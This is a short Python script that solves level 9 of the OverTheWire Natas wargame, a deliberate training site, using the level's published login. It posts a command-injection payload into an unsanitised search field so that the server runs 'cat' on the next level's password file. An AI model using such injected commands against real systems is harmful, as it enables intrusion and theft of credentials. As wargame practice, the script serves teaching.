# Natas9 python solution
# By Emil 'Dota' Bak, 2019

import requests
from bs4 import BeautifulSoup

# ***********************************************
URL = "http://natas9.natas.labs.overthewire.org"

auth_name = 'natas9'
auth_pass = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'

s      = requests.Session()
s.auth = (auth_name,auth_pass)
# ***********************************************

# By viewing the source-code, it can be noted that the user
# has access to a non-sanitized input, namely '$key'.
# This allows the user to inject arbitrary shellcode.
INPUT = "; cat /etc/natas_webpass/natas10 ; grep -i zxy"

DATA = dict(needle=INPUT, submit="submit")

r = s.post(URL, data=DATA)

soup  = BeautifulSoup(r.text,"html.parser")
print soup.find('pre').contents[0]